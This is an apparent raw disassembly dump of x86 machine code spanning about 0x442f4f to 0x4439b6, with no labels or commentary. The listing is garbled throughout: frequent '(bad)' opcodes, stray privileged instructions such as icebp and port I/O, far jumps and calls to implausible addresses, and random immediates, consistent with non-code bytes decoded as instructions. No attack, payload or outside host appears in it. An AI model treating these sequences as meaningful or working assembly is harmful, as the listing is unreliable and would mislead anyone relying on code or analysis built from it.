  442f4f:	ror    DWORD PTR ds:0x6ecf7dc8,1
  442f55:	sbb    bl,dl
  442f57:	jb     0x442f9e
  442f59:	cmp    BYTE PTR [ebp+0x7f0f6ea8],0xc8
  442f60:	push   cs
  442f61:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  442f62:	add    cl,ch
  442f64:	or     eax,0x4faa85b8
  442f69:	xchg   edi,eax
  442f6a:	or     BYTE PTR [eax-0x16dd0891],ch
  442f70:	pop    ecx
  442f71:	(bad)  
  442f72:	(bad)  
  442f73:	jmp    0xf18fb1c7
  442f78:	dec    edi
  442f79:	mov    ds:0x7fcdea18,al
  442f7e:	inc    ecx
  442f7f:	rcl    DWORD PTR [edi-0x2a45d019],1
  442f85:	aad    0xf1
  442f87:	cs icebp 
  442f89:	std    
  442f8a:	(bad)  
  442f8b:	call   0xe5bd549e
  442f90:	push   cs
  442f91:	stc    
  442f92:	or     DWORD PTR [edi+0x5],0xffffffbe
  442f99:	add    esp,DWORD PTR [edx+0x0]
  442f9c:	fiadd  WORD PTR [ebx]
  442f9e:	call   0x403d50
  442fa3:	mov    al,BYTE PTR [eax]
	...
  442fc1:	add    BYTE PTR [ecx+0xc4780fb],ah
  442fc7:	jnp    0x443003
  442fc9:	xor    BYTE PTR [edi],bl
  442fcb:	ss clc 
  442fcd:	(bad)  
  442fce:	mov    bl,0xf8
  442fd0:	(bad)  
  442fd1:	jmp    DWORD PTR [eax+eax*4-0x35ef38b]
  442fd8:	sbb    esp,0x7f
  442fdb:	add    eax,DWORD PTR [eax]
  442fdd:	cmp    ecx,0xfffffffe
  442fe0:	std    
  442fe1:	push   cs
  442fe2:	lock rol BYTE PTR [ebx],1
  442fe5:	add    BYTE PTR [esi+edi*2+0x77],ah
  442fe9:	add    al,0x74
  442feb:	out    dx,eax
  442fec:	adc    ecx,DWORD PTR [ebx+0x7d97faa]
  442ff2:	xchg   edi,eax
  442ff3:	xchg   DWORD PTR [ebx],esp
  442ff5:	icebp  
  442ff6:	mov    ds:0x340011fb,eax
  442ffb:	add    esp,ecx
  442ffd:	pop    edx
  442ffe:	das    
  442fff:	add    eax,DWORD PTR [eax]
  443001:	sub    DWORD PTR [edx-0x1],0x6a
  443005:	sub    bl,BYTE PTR [edi+0x349b84fa]
  44300b:	add    eax,DWORD PTR [eax]
  44300d:	add    BYTE PTR [edi+0x3b00fbf0],dh
  443013:	jg     0x442fae
  443015:	or     esp,DWORD PTR [ebx+eax*1]
  443018:	pop    es
  443019:	mov    dh,0xf6
  44301b:	jno    0x443062
  44301d:	cld    
  44301e:	outs   dx,DWORD PTR ds:[esi]
  44301f:	ret    0xe0cb
  443022:	es jg  0x442fe3
  443025:	or     BYTE PTR [eax],al
	...
  443043:	add    BYTE PTR [ebp+0x49],bh
  443046:	clc    
  443047:	add    ecx,DWORD PTR [edi+edi*2-0xa]
  44304b:	add    ecx,DWORD PTR ds:0xc685cfcb
  443051:	out    0x98,eax
  443053:	test   esi,ecx
  443055:	sbb    DWORD PTR [ebx+0x1388fff],esp
  44305b:	xchg   DWORD PTR [edx-0x6b],edx
  44305e:	cmp    al,0xe
  443061:	outs   dx,BYTE PTR ds:[esi]
  443062:	push   esi
  443063:	stc    
  443064:	jmp    0x4e7fbc7c
  443069:	cdq    
  44306a:	(bad)  
  44306b:	in     eax,0xf
  44306d:	(bad)  
  44306e:	add    al,0xb
  443070:	or     eax,0xa37cfd99
  443075:	cdq    
  443076:	pushf  
  443077:	stc    
  443078:	pop    ss
  443079:	cdq    
  44307a:	std    
  44307b:	test   BYTE PTR [edx+0x0],cl
  44307e:	jns    0x443071
  443080:	jp     0x443017
  443082:	cmp    BYTE PTR [ebx+0x1],0x97
  443086:	mov    BYTE PTR [ecx],0xfe
  443089:	cwde   
  44308a:	std    
  44308b:	(bad)  
  44308c:	fdivr  st,st(4)
  44308e:	ret    0xfe5
  443091:	sbb    bl,BYTE PTR [edi-0x7029a03]
  443097:	dec    DWORD PTR [edx+0x57]
  44309a:	call   0xd00:0xd954bfe
  4430a1:	cdq    
  4430a2:	sub    dl,0xe
  4430a5:	nop
  4430a6:	int    0x6
	...
  4430c4:	add    BYTE PTR [eax],al
  4430c6:	or     eax,0x15437a99
  4430cb:	push   esi
  4430cc:	cmp    eax,0x440eea18
  4430d1:	add    BYTE PTR [edx-0x6b],cl
  4430d4:	adc    BYTE PTR [eax],al
  4430d6:	or     eax,0xfe5c497
  4430db:	sbb    bl,BYTE PTR [edi-0x5131a03]
  4430e1:	push   edx
  4430e3:	add    BYTE PTR [esi-0x3f],ch
  4430e6:	push   0xf3dee29f
  4430eb:	sar    DWORD PTR [esi],1
  4430ed:	xchg   bh,dl
  4430ef:	loopne 0x4430c6
  4430f1:	in     eax,0x51
  4430f3:	and    eax,DWORD PTR [ebx+0x3]
  4430f6:	adc    al,0x7c
  4430f8:	ds std 
  4430fa:	ret    0xe2a5
  4430fd:	jns    0x4430ba
  4430ff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  443100:	pushf  
  443101:	scas   eax,DWORD PTR es:[edi]
  443102:	mov    BYTE PTR [esi-0x7f145cca],dh
  443108:	and    ebx,edi
  44310a:	mov    ecx,DWORD PTR [ebx+0xf]
  44310d:	push   es
  44310e:	mov    ch,0x81
  443110:	or     ebx,esp
  443112:	and    dh,al
  443114:	outs   dx,BYTE PTR ds:[esi]
  443115:	mov    esi,0xd3f2c190
  44311a:	movs   DWORD PTR es:[edi],DWORD PTR cs:[esi]
  44311c:	repnz add cl,BYTE PTR ds:0x381300bf
  443123:	mov    edi,0xaa0086f2
  443128:	fidiv  DWORD PTR [ecx+0x0]
	...
  443146:	add    BYTE PTR [eax],al
  443148:	xor    cl,cl
  44314a:	push   ss
  44314b:	mov    edx,0x9db22d8
  443150:	mov    bh,BYTE PTR ds:0xf60cc927
  443156:	out    0x3,al
  443158:	or     eax,0x137a6af5
  44315d:	add    bh,ah
  44315f:	enter  0xf50c,0xe6
  443163:	add    ecx,DWORD PTR ds:0x8a442279
  443169:	cmp    ebx,DWORD PTR [ebx+0x62f54d87]
  44316f:	or     al,0xf
  443171:	add    bh,ah
  443173:	jl     0x4431cb
  443175:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  443176:	mov    esi,0xfffb7fc2
  44317b:	popa   
  44317c:	into   
  44317d:	jl     0x4431ca
  44317f:	jne    0x4431f1
  443181:	cmp    eax,esi
  443183:	and    cl,dh
  443185:	xor    DWORD PTR [ebx],eax
  443187:	jb     0x443157
  443189:	jl     0x4431ce
  44318b:	pop    ebp
  44318c:	xchg   edx,eax
  44318d:	mov    edi,0xfd8b6509
  443192:	(bad)  
  443193:	call   0x73386ae1
  443198:	pop    edx
  443199:	test   al,0x85
  44319b:	lods   al,BYTE PTR ds:[esi]
  44319c:	xchg   esi,eax
  44319d:	xor    al,0x4e
  44319f:	cdq    
  4431a0:	xchg   esi,eax
  4431a1:	xchg   ecx,eax
  4431a2:	es jmp 0x1587acb6
  4431a8:	push   cs
  4431a9:	inc    ecx
  4431aa:	clc    
  4431ab:	rol    BYTE PTR [eax],0x0
	...
  4431ca:	push   ebx
  4431cb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4431cc:	daa    
  4431cd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4431ce:	pop    esi
  4431cf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4431d0:	inc    esp
  4431d1:	adc    DWORD PTR [eax],ecx
  4431d3:	push   ecx
  4431d4:	clc    
  4431d5:	push   0x55
  4431d7:	repz es scas al,BYTE PTR es:[edi]
  4431da:	into   
  4431db:	pushf  
  4431dc:	repnz loopne 0x4431ed
  4431df:	add    BYTE PTR [ebp-0x19],bh
  4431e2:	or     al,0x13
  4431e4:	and    ch,BYTE PTR [edx+ebp*1-0x24]
  4431e8:	jmp    FWORD PTR [ecx+0x2b]
  4431eb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4431ec:	add    dh,bl
  4431ee:	mov    ah,ah
  4431f0:	add    eax,0xb1f70ee9
  4431f5:	jmp    0x443274
  4431f7:	cmp    ah,bh
  4431f9:	bound  ecx,QWORD PTR [edx+esi*4-0x20]
  4431fd:	sub    ecx,DWORD PTR [eax-0x3c8ff73f]
  443203:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  443204:	std    
  443205:	ror    BYTE PTR [ecx+0x3f1b0aa9],0x7a
  44320c:	lds    ebp,FWORD PTR [edx+0x6f]
  44320f:	push   es
  443210:	mov    edi,0x78fa9f00
  443215:	shl    ebp,0xfe
  443218:	(bad)  
  443219:	jmp    FWORD PTR [edi-0x44]
  44321c:	or     DWORD PTR [edi+0x4],0x5f05e3bf
  443223:	fs jnp 0x443206
  443226:	jecxz  0x4432a4
  443228:	(bad)  [edi]
  44322a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44322b:	jl     0x4431e6
  44322d:	add    al,0x0
	...
  44324b:	add    BYTE PTR ds:0x62830484,ah
  443251:	add    DWORD PTR [ecx+0x7f],edi
  443254:	aam    0x11
  443256:	stc    
  443257:	jmp    DWORD PTR [esi+eiz*1+0x402d643f]
  44325e:	pop    esp
  44325f:	(bad)  
  443261:	xchg   ebx,eax
  443262:	repnz inc DWORD PTR [ebx]
  443265:	jl     0x44325f
  443267:	push   ds
  443268:	mov    bl,0x78
  44326a:	sub    edi,ecx
  44326c:	add    esi,DWORD PTR [eax-0x41]
  44326f:	inc    edi
  443270:	pushf  
  443271:	(bad)  
  443272:	(bad)  
  443273:	push   DWORD PTR [eax+edi*4-0x1]
  443277:	adc    BYTE PTR [edi+edi*8-0x1],ah
  44327b:	mov    dl,BYTE PTR [ebx-0x2fb0ccf9]
  443281:	out    dx,al
  443282:	dec    ecx
  443283:	jmp    0x4432fc
  443285:	add    BYTE PTR [ecx+0x0],0xe7
  443289:	push   ecx
  44328a:	sti    
  44328b:	jb     0x443293
  44328d:	jg     0x443304
  44328f:	cld    
  443290:	xor    al,0xa2
  443292:	jge    0x443250
  443294:	cmp    eax,0xba0effff
  443299:	std    
  44329a:	test   BYTE PTR [ebp+0x60],0x27
  44329e:	(bad)  
  44329f:	rcl    DWORD PTR [esi+edi*1+0x241cc67b],cl
  4432a6:	dec    ebp
  4432a7:	clc    
  4432a8:	or     eax,0x137dc596
  4432ad:	xchg   esi,eax
  4432ae:	das    
  4432af:	fiadd  DWORD PTR [eax]
	...
  4432cd:	add    BYTE PTR [esi-0x45f6e42f],dl
  4432d3:	pushf  
  4432d4:	dec    eax
  4432d5:	sub    BYTE PTR [edi],0xd9
  4432d8:	add    eax,DWORD PTR [ebp+0x1a315c6]
  4432de:	jae    0x443310
  4432e0:	inc    eax
  4432e1:	inc    ecx
  4432e2:	pop    ebp
  4432e3:	inc    edx
  4432e4:	inc    ecx
  4432e5:	push   0xbf155986
  4432ea:	out    0x95,al
  4432ec:	jle    0x4432d8
  4432ee:	push   cs
  4432ef:	(bad)  
  4432f0:	cmp    BYTE PTR [edi+edi*1+0x26],bl
  4432f4:	ins    BYTE PTR es:[edi],dx
  4432f5:	or     eax,0x36fd990d
  4432fa:	dec    edx
  4432fb:	shr    DWORD PTR [esi],0x1d
  4432fe:	mov    dh,0x91
  443300:	and    BYTE PTR [ecx+ebp*8+0xdfffd98],0x1e
  443308:	push   ecx
  443309:	push   0x53004a02
  44330e:	lea    esi,[esi+0x73e003d]
  443314:	and    al,BYTE PTR [edi-0x6d2a61f]
  44331a:	retf   0xec80
  44331d:	inc    eax
  44331e:	cmc    
  44331f:	inc    esi
  443320:	mov    ds:0x7088a8b,al
  443325:	add    BYTE PTR ds:0x846c3a1c,cl
  44332b:	xchg   edi,eax
  44332c:	jl     0x44336f
  44332e:	fldcw  WORD PTR [ebx]
  443330:	xchg   edx,eax
  443331:	lock add BYTE PTR [eax],al
	...
  443350:	setns  ch
  443353:	dec    ebp
  443354:	mov    cl,dl
  443356:	push   edi
  443357:	push   eax
  443358:	fcomp  QWORD PTR [ecx-0x3]
  44335b:	add    BYTE PTR ds:0xab03e700,cl
  443361:	push   cs
  443362:	ins    BYTE PTR es:[edi],dx
  443363:	inc    esi
  443364:	popf   
  443365:	dec    edi
  443366:	std    
  443367:	add    esp,DWORD PTR ds:0xd03d548
  44336d:	jne    0x44338b
  44336f:	lods   al,BYTE PTR ds:[esi]
  443370:	cmp    BYTE PTR [edi+ebx*8+0x6cc84e7c],0xc3
  443378:	add    al,0x7b
  44337a:	inc    esp
  44337b:	sti    
  44337c:	jmp    0xe2b9:0x754670a1
  443383:	adc    DWORD PTR ds:0x4c7ae700,ecx
  443389:	sbb    al,0xe6
  44338b:	inc    esi
  44338c:	sub    eax,0x141ba9e7
  443391:	jge    0x4433d9
  443393:	add    al,0xd
  443395:	add    BYTE PTR [esi+0x3e],bl
  443398:	pop    ecx
  443399:	push   0xd03e8
  44339e:	mov    ss:0x3bab3188,eax
  4433a4:	clc    
  4433a5:	mov    esp,0x7513ff5e
  4433aa:	sub    ah,al
  4433ac:	jne    0x4433a6
  4433ae:	icebp  
  4433af:	jne    0x4433fe
  4433b1:	ja     0x44335f
  4433b3:	mov    bh,0x0
	...
  4433d1:	add    BYTE PTR [eax-0x46],al
  4433d4:	jns    0x4433c4
  4433d6:	icebp  
  4433d7:	and    ch,bl
  4433d9:	add    dl,BYTE PTR [esp+edi*2]
  4433dc:	mov    dl,0xfc
  4433de:	bound  esp,QWORD PTR [ecx-0x5da48a16]
  4433e4:	and    al,0xb0
  4433e6:	mov    BYTE PTR [edx+0x3190a4b6],dh
  4433ec:	sbb    eax,DWORD PTR [edx-0x40]
  4433ef:	mov    ecx,0x685500ef
  4433f4:	add    al,ch
  4433f6:	push   cs
  4433f7:	add    BYTE PTR [eax],al
  4433f9:	call   0x4ca6:0x35497b71
  443400:	clc    
  443401:	xor    DWORD PTR [esp+eiz*2],ebp
  443404:	test   ebp,esp
  443406:	(bad)  
  443407:	jnp    0x4433c8
  443409:	test   al,0xa9
  44340b:	test   DWORD PTR [eax],0x4b78c93f
  443411:	jne    0x4433f7
  443413:	mov    esi,0x6174a871
  443418:	mov    edi,0x43790181
  44341d:	cmp    eax,0xf9f8232b
  443422:	sbb    eax,0xd140bf0a
  443427:	div    DWORD PTR [ecx+0x259adc20]
  44342d:	cmp    BYTE PTR [edi+esi*1+0x68],al
  443431:	(bad)  
  443432:	aaa    
  443433:	cmp    al,0x49
  443435:	mov    ecx,0x0
	...
  443452:	add    BYTE PTR [eax],al
  443454:	popa   
  443455:	ds push 0xf9a0e440
  44345b:	jmp    0x28c94b3b
  443460:	into   
  443461:	xchg   edi,eax
  443462:	or     dh,ah
  443464:	sbb    al,al
  443466:	jge    0x443491
  443468:	por    mm5,mm7
  44346b:	jp     0x4434eb
  44346d:	jne    0x443404
  44346f:	jmp    0x6a443482
  443474:	and    ah,BYTE PTR [eax+eax*1+0x83092de]
  44347b:	jmp    0xebf62b8e
  443480:	test   eax,0x9062fc34
  443485:	mov    dl,0xe0
  443487:	bound  ecx,QWORD PTR [ebx]
  443489:	lods   al,BYTE PTR ds:[esi]
  44348a:	add    BYTE PTR ds:[edi+0x6c0308ba],dh
  443491:	mov    ds:0xbca7c5af,eax
  443496:	cli    
  443497:	mov    BYTE PTR [ecx],al
  443499:	push   esp
  44349a:	xor    esi,eax
  44349c:	push   es
  44349d:	retf   0x4783
  4434a0:	cld    
  4434a1:	mov    ds:0x8757cdaf,al
  4434a6:	and    esi,ecx
  4434a8:	jno    0x44346d
  4434aa:	pop    es
  4434ab:	test   BYTE PTR [ebp+0x4],al
  4434ae:	add    BYTE PTR [eax],al
  4434b0:	jmp    0x4434c6
  4434b2:	dec    esp
  4434b3:	inc    edi
  4434b4:	or     bl,BYTE PTR [ecx]
  4434b6:	mov    ebx,0x83
	...
  4434d3:	add    BYTE PTR [eax],al
  4434d5:	add    BYTE PTR [eax+eax*1-0x3d083f85],dl
  4434dc:	jecxz  0x4434e0
  4434de:	pop    ebp
  4434df:	fsubrp st(3),st
  4434e1:	mov    DWORD PTR [ecx-0x491184a9],esp
  4434e7:	jp     0x443486
  4434e9:	add    BYTE PTR [ebx+eax*1+0x5579835e],dh
  4434f0:	or     DWORD PTR [edi],ecx
  4434f2:	xor    bl,BYTE PTR [esi-0x7f]
  4434f5:	dec    ebp
  4434f6:	sbb    dh,dl
  4434f8:	lea    esi,ds:[ebp+0x0]
  4434fc:	xor    esi,eax
  4434fe:	ja     0x4434ba
  443500:	test   bh,bh
  443502:	daa    
  443503:	out    dx,al
  443504:	sti    
  443505:	add    BYTE PTR [ebx-0x79],ch
  443508:	fld    DWORD PTR [edi]
  44350a:	je     0x44350f
  44350c:	pop    es
  44350d:	mov    dh,0x66
  44350f:	ins    BYTE PTR es:[edi],dx
  443510:	inc    ebp
  443511:	cld    
  443512:	out    dx,eax
  443513:	pop    esp
  443514:	retf   
  443515:	loopne 0x443506
  443517:	fstp   st(3)
  443519:	inc    edx
  44351a:	test   ecx,0x194c0308
  443520:	cmp    DWORD PTR [ebx],eax
  443522:	or     eax,0x6f84f20
  443527:	mov    ecx,0xb25ed732
  44352c:	jns    0x4434eb
  44352e:	mov    cs,ecx
  443530:	std    
  443531:	jl     0x443580
  443533:	stos   BYTE PTR es:[edi],al
  443534:	jl     0x443579
  443536:	and    DWORD PTR [eax-0x67],ebp
  443539:	std    
	...
  443556:	add    BYTE PTR [eax],al
  443558:	pop    edx
  443559:	movs   DWORD PTR es:[edi],DWORD PTR fs:[esi]
  44355b:	stc    
  44355c:	sbb    dh,BYTE PTR [edx+0x41]
  44355f:	mov    ecx,esp
  443561:	lods   eax,DWORD PTR ds:[esi]
  443562:	jmp    0x17b:0x82c67eef
  443569:	test   eax,0xa59983f6
  44356e:	std    
  44356f:	inc    DWORD PTR [edx]
  443571:	fild   WORD PTR [ecx]
  443573:	stc    
  443574:	pop    eax
  443575:	sub    eax,0x48beca79
  44357a:	jns    0x4435c7
  44357c:	mov    ecx,0x5c2826a
  443581:	stos   BYTE PTR es:[edi],al
  443582:	lds    ecx,FWORD PTR [ebx+0x537ca64c]
  443588:	lds    eax,FWORD PTR [ecx]
  44358a:	mov    ah,0x6e
  44358c:	aam    0xf9
  44358e:	cwde   
  44358f:	test   esi,ecx
  443591:	sub    DWORD PTR [ecx+edi*2-0x79071772],esp
  443598:	dec    eax
  443599:	std    
  44359a:	ret    0x12e5
  44359d:	and    DWORD PTR [ebx-0x270a6d07],ebp
  4435a3:	mov    esi,0x4378f90e
  4435a8:	jns    0x443597
  4435aa:	ds in  al,0xd
  4435ad:	test   eax,0x6586fffd
  4435b2:	adc    eax,0x3d2152fd
  4435b7:	fs push cs
  4435b9:	add    BYTE PTR [edx],ch
  4435bb:	and    al,0x0
	...
  4435d9:	add    BYTE PTR [eax],ah
  4435db:	enter  0x82ea,0x47
  4435df:	add    edi,esp
  4435e1:	add    ecx,eax
  4435e3:	sbb    al,0xd3
  4435e5:	add    edi,DWORD PTR [ecx+0x31406dfb]
  4435eb:	stos   BYTE PTR es:[edi],al
  4435ec:	out    0x78,al
  4435ee:	retf   0x5dff
  4435f1:	cmp    dh,BYTE PTR [ebp-0x504fe362]
  4435f7:	mov    BYTE PTR [ebx],ch
  4435f9:	cmp    ebx,DWORD PTR [ebp-0x6fe3dd62]
  4435ff:	sbb    al,0x9b
  443601:	add    edi,DWORD PTR [esi-0x54]
  443604:	pop    esi
  443605:	inc    edx
  443606:	imul   eax,DWORD PTR [ecx],0x4542242a
  44360c:	psubq  mm6,QWORD PTR [eax-0x5]
  443610:	jo     0x4435bc
  443612:	in     al,0x81
  443614:	stos   BYTE PTR es:[edi],al
  443615:	or     BYTE PTR [esp+eax*4],dl
  443618:	cwde   
  443619:	add    DWORD PTR ds:0x9486c100,ecx
  44361f:	adc    ch,ah
  443621:	add    ecx,DWORD PTR ds:0x907fda00
  443627:	push   es
  443628:	out    0x3,eax
  44362a:	xchg   BYTE PTR [ebp+0xd00f7],al
  443630:	cmp    bh,BYTE PTR fs:[ecx]
  443633:	xchg   eax,ebp
  443635:	jl     0x443683
  443637:	dec    esp
  443638:	je     0x4435cc
  44363a:	popf   
  44363b:	add    ah,bh
  44363d:	add    eax,DWORD PTR [eax]
	...
  44365b:	add    BYTE PTR [ebx-0x77],al
  44365e:	mov    edx,0xb3459623
  443663:	push   ebx
  443664:	rol    ah,cl
  443666:	out    0xfc,eax
  443668:	jp     0x443607
  44366a:	out    0x55,eax
  44366c:	xchg   BYTE PTR [ebp+0x0],al
  44366f:	jns    0x44362f
  443671:	and    eax,0xd00f00ff
  443676:	(bad)  
  443677:	call   0x705cfb0d
  44367c:	adc    bh,BYTE PTR [eax-0x7dbb567d]
  443682:	mov    ebx,0x859774d4
  443687:	push   ds
  443688:	adc    eax,0xb64d4989
  44368d:	cs push eax
  44368f:	fs jl  0x443622
  443692:	(bad)  
  443693:	call   0x2ecf84a6
  443698:	leave  
  443699:	das    
  44369a:	dec    edi
  44369b:	jb     0x443671
  44369d:	pop    ds
  44369e:	shr    ecx,0xc
  4436a1:	add    BYTE PTR [eax],al
  4436a3:	jmp    0x19a87629
  4436a8:	xor    BYTE PTR [ecx+ecx*2],0xf9
  4436ac:	pop    eax
  4436ad:	inc    BYTE PTR es:[eax-0x17001958]
  4436b4:	mov    ebx,eax
  4436b6:	sbb    BYTE PTR [eax+0x1a],dh
  4436b9:	mov    eax,0x81d42983
  4436be:	sbb    al,0x5c
	...
  4436dc:	add    BYTE PTR [eax],al
  4436de:	je     0x443676
  4436e0:	jge    0x4436ae
  4436e2:	mov    edx,0x669c84fe
  4436e7:	mov    esi,0xeda01
  4436ec:	add    dh,ah
  4436ee:	sub    dl,BYTE PTR [ecx]
  4436f0:	add    ch,cl
  4436f2:	push   cs
  4436f3:	mov    edi,0xefd01
  4436f8:	add    BYTE PTR [edx-0x16],ch
  4436fb:	fwait
  4436fc:	add    bl,BYTE PTR [ebx+0x197b1d24]
  443702:	or     ebx,DWORD PTR [ebp-0x2d9bff07]
  443708:	pop    esp
  443709:	mov    ebp,DWORD PTR [ecx+0xc4d8498]
  44370f:	sbb    ecx,DWORD PTR [ebp-0x10]
  443712:	in     eax,dx
  443713:	fisttp DWORD PTR [ebx]
  443715:	mov    esp,DWORD PTR [ecx]
  443717:	ins    BYTE PTR es:[edi],dx
  443718:	or     DWORD PTR [eax],0x89dfd5df
  44371e:	add    al,0xf4
  443720:	adc    BYTE PTR [ebp+0x50],0x31
  443724:	adc    DWORD PTR [eax+0x28],0xc5f8130
  44372b:	sbb    DWORD PTR [edi+0x3c],ebp
  44372e:	dec    esp
  44372f:	push   edi
  443730:	sub    BYTE PTR [eax],al
  443732:	xor    al,0x1b
  443734:	cmp    eax,0xc309f08
  443739:	mov    ebx,esp
  44373b:	repz sbb BYTE PTR [edi-0x24],0x1c
  443740:	outs   dx,DWORD PTR ds:[esi]
  443741:	cmp    al,0x0
	...
  44375f:	add    BYTE PTR [ebp+0x4a],ch
  443762:	call   0x40610bf2
  443767:	add    al,0x67
  443769:	pop    ebx
  44376a:	or     BYTE PTR [ebx+0x4d829ca3],al
  443770:	fs push ss
  443772:	dec    ebp
  443773:	clc    
  443774:	pop    ebp
  443775:	(bad)  
  443777:	punpckhwd mm6,QWORD PTR [ebx]
  44377a:	std    
  44377b:	push   DWORD PTR [eax+eax*8-0x403b81]
  443782:	(bad)  
  443783:	(bad)  
  443784:	push   ebx
  443785:	push   0x9a51e9f7
  44378a:	stc    
  44378b:	jmp    FWORD PTR [edi]
  44378d:	fcom   DWORD PTR [ebx-0x48]
  443790:	mov    ch,0xff
  443792:	(bad)  
  443793:	call   edi
  443795:	pop    esi
  443796:	mov    edi,0xbe887
  44379b:	add    BYTE PTR ds:0xdfffda9,cl
  4437a1:	popa   
  4437a2:	in     al,0xbc
  4437a4:	xchg   cl,dl
  4437a6:	jnp    0x4437e9
  4437a8:	ror    DWORD PTR ds:0xe19687f9,0xbd
  4437af:	out    0x15,eax
  4437b1:	mov    edx,0xec84c76f
  4437b6:	scas   eax,DWORD PTR es:[edi]
  4437b7:	xor    eax,0x85433343
  4437bc:	dec    edx
  4437bd:	es daa 
  4437bf:	cld    
  4437c0:	or     eax,0xbf79ba
	...
  4437e1:	add    BYTE PTR [eax],dl
  4437e3:	test   eax,0xa77b08fd
  4437e8:	mov    ds:0xb21e294b,al
  4437ed:	int    0x2d
  4437ef:	push   ds
  4437f0:	xor    DWORD PTR [edi+ecx*8+0x25],edx
  4437f4:	mov    edx,0x6cc10e08
  4437f9:	dec    DWORD PTR [edx]
  4437fb:	test   eax,0x1dedccfd
  443800:	xor    DWORD PTR [esp+eax*4-0x5],ecx
  443804:	stos   DWORD PTR es:[edi],eax
  443805:	dec    eax
  443806:	cs data16 jne 0x44380e
  44380a:	mov    WORD PTR ds:0xa0f4bfbc,ds
  443810:	repnz mov cl,0xc4
  443813:	(bad)  
  443815:	hlt    
  443816:	push   ss
  443817:	jmp    0x443841
  443819:	mov    edi,0x83f0e891
  44381e:	int    0xa8
  443820:	std    
  443821:	jmp    DWORD PTR [ebp-0x28]
  443824:	lock xor BYTE PTR [ebp-0x58],0xfd
  443829:	call   DWORD PTR [esi+0x15e7c2e0]
  44382f:	and    BYTE PTR [edi],dh
  443831:	aam    0xa
  443833:	add    BYTE PTR [ecx-0x43],bl
  443836:	mov    cl,BYTE PTR [ebx+eax*1-0x9]
  44383a:	mov    esp,0x6938e6c7
  44383f:	mov    BYTE PTR [edi+eax*8+0x3e700b5],ah
	...
  443862:	add    BYTE PTR [eax],al
  443864:	or     eax,0xd67b07af
  443869:	mov    ds:0xaea1e29f,eax
  44386e:	(bad)  
  44386f:	jp     0x443837
  443871:	xchg   ebx,eax
  443872:	test   al,0x9c
  443874:	std    
  443875:	(bad)  
  443876:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  443877:	jp     0x4438ce
  443879:	xchg   BYTE PTR [edx],ch
  44387b:	cmp    BYTE PTR [eax+0x7cf65f03],cl
  443881:	dec    esp
  443882:	fwait
  443883:	jl     0x443853
  443885:	xchg   ebx,eax
  443886:	test   al,0x9b
  443888:	adc    eax,0x20c3790b
  44388d:	mov    edi,0x399fbdee
  443892:	mov    ?,ebp
  443894:	xchg   DWORD PTR [esi-0x19],esi
  443897:	add    ecx,DWORD PTR ds:0x1286600
  44389d:	add    edx,ebx
  44389f:	jg     0x4438bb
  4438a1:	add    esp,edi
  4438a3:	add    eax,DWORD PTR [edx+edx*2]
  4438a6:	in     eax,0x7a
  4438a8:	xlat   BYTE PTR ds:[ebx]
  4438a9:	lods   eax,DWORD PTR ds:[esi]
  4438aa:	xchg   DWORD PTR [edx+0x56],edi
  4438ad:	mov    esp,0x3ed9386a
  4438b2:	out    0xcb,al
  4438b4:	add    al,0x52
  4438b6:	and    al,0x7c
  4438b8:	dec    esi
  4438b9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4438ba:	loop   0x443929
  4438bc:	retf   0x1efd
  4438bf:	imul   edi,DWORD PTR [edx-0x3ffc1867],0xffffffa0
  4438c6:	outs   dx,BYTE PTR ds:[esi]
  4438c7:	cmp    BYTE PTR [eax],al
	...
  4438e5:	add    BYTE PTR [ecx-0x59d0ff83],dh
  4438eb:	adc    BYTE PTR [ebx+0x31],0xd6
  4438ef:	cli    
  4438f0:	mov    esp,0xb107763a
  4438f5:	lods   al,BYTE PTR ds:[esi]
  4438f6:	push   eax
  4438f7:	fwait
  4438f8:	shl    BYTE PTR [edx+0x3b],0x4c
  4438fc:	test   ebp,esp
  4438fe:	xchg   ecx,eax
  4438ff:	add    DWORD PTR [ebx-0x3],0xee08a84e
  443906:	clc    
  443907:	mov    edi,0xd382abfd
  44390c:	shl    DWORD PTR [esi-0x4c],0x6
  443910:	mov    dl,0x34
  443912:	dec    edx
  443913:	add    DWORD PTR [ebx-0x2b],0x5c
  443917:	mov    ds:0x86c6d825,eax
  44391c:	(bad)  
  44391d:	repnz push cs
  44391f:	add    BYTE PTR [ebp+0x8a14eb1],al
  443925:	out    dx,al
  443926:	mov    eax,0x4d65ffc0
  44392b:	repz (bad) 
  44392d:	call   0x9869dc6f
  443932:	xchg   esi,eax
  443933:	inc    esp
  443934:	in     al,0x72
  443936:	leave  
  443937:	pop    eax
  443938:	out    0xf9,eax
  44393a:	xchg   DWORD PTR [edi+0x40],eax
  44393d:	ror    DWORD PTR gs:[eax*1-0xe0f52],1
  443945:	call   0xed7ada58
	...
  443966:	add    BYTE PTR [eax],al
  443968:	push   cs
  443969:	add    BYTE PTR [eax-0x3f12d537],ch
  44396f:	outs   dx,BYTE PTR ds:[esi]
  443970:	int    0xf2
  443972:	(bad)  
  443973:	call   0x573dcfe9
  443978:	cmp    dh,0x4
  44397b:	jmp    0x12b398e
  443980:	add    eax,0x7c000000
  443985:	inc    ebx
  443986:	je     0x443997
  443988:	das    
  443989:	fld    DWORD PTR [edi]
  44398b:	(bad)  
  44398c:	fs add al,0x27
  44398f:	jbe    0x4439f5
  443991:	cld    
  443992:	loopne 0x44399c
  443994:	jo     0x443992
  443996:	dec    DWORD PTR [esi]
  443998:	loop   0x4439f5
  44399a:	jnp    0x44397d
  44399c:	pop    ebx
  44399d:	adc    eax,0x9b234847
  4439a2:	push   cs
  4439a3:	add    BYTE PTR [esp+edi*8-0x7e],dh
  4439a7:	inc    edi
  4439a8:	lods   al,BYTE PTR ds:[esi]
  4439a9:	sbb    eax,eax
  4439ab:	je     0x443960
  4439ad:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4439ae:	jmp    0xa4553726
  4439b3:	and    al,0x34
  4439b5:	cld    
  4439b6:	(bad)  
